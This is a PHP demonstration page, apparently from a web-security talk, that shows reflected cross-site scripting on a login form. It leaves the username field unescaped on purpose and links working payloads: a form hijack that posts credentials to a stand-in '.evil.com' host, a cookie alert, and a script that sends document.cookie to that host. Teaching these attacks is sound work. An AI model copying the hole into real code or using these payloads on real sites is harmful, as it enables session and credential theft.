<?php include('../head.php'); ?>

	<h1>Cross Site Scripting (XSS)</h1>
	<p><strong>Sub-types</strong> Reflected, Stored, DOM-based, Cross Site Flashing.</p>
	<div class="row">
		<div class="col-md-8">
			<h2>Reflected XSS</h2>
			<form action="index.php" method="post">
				<div><label>Username <input type="text" name="username" class="form-control" value="<?php echo $_GET['user'] ?>"/></label></div>
				<div><label>Password <input type="password" name="password" class="form-control"/></label></div>
				<div><button class="btn btn-sm btn-primary" type="submit">Login</button></div>
				<p>
					<a class="btn btn-xs btn-default" href="./?user=ben">Example</a>
					<a class="btn btn-xs btn-default" href="./?user=<?php echo urlencode('"/><img src="/img/logo.png" width="100" height="100" /><span class="') ?>">Reflected 1</a>
					<a class="btn btn-xs btn-default" href="./?user=<?php echo urlencode('" style="display:none"/></label></div></form><form action="http://webappsec.talks.ctoforhire.com.au.evil.com/collect.php?"><div><label><input type="text" name="username" class="form-control" value="') ?>">Reflected 2</a>
				</p>
				<p>
					<a class="btn btn-xs btn-default" href="./?user=<?php echo urlencode('"/><script>alert("foo");</script><span class="') ?>">DOM 1</a>
					<a class="btn btn-xs btn-default" href="./?user=<?php echo urlencode('"/><script>alert(document.cookie);</script><span class="') ?>">DOM 2</a>
					<a class="btn btn-xs btn-default" href="./?user=<?php echo urlencode('"/><script>var img=new Image(); img.src="http://webappsec.talks.ctoforhire.com.au.evil.com/collect.php?"+document.cookie;</script><span class="') ?>">DOM 3</a>
				</p>
				<p>Last request: <strong><?php echo htmlspecialchars($_GET['user']) ?></strong></p>
				<p>HTML generated: <strong><?php echo htmlspecialchars('<div><label>Username <input type="text" name="username" class="form-control" value="' . $_GET['user'] . '"/></label></div>') ?></strong></p>

			</form>
		</div>
		<div class="col-md-4">
			<h2>XSS: Collection</h2>
			<textarea style="width: 100%; height: 10em"><?php echo htmlspecialchars(file_get_contents('../../evil/collect.txt')) ?></textarea>
			<a class="btn btn-sm btn-danger" href="http://webappsec.talks.ctoforhire.com.au.evil.com/collect-reset.php">Reset</a>
			<h2>Others...</h2>
			<ul>
				<li>Stored is when an XSS attack is saved to the DB</li>
				<li>Cross Site Flashing is the embedding of flash attacks instead of DOM-based attacks</li>
			</ul>
		</div>
	</div>
	
<?php include('../foot.php'); ?>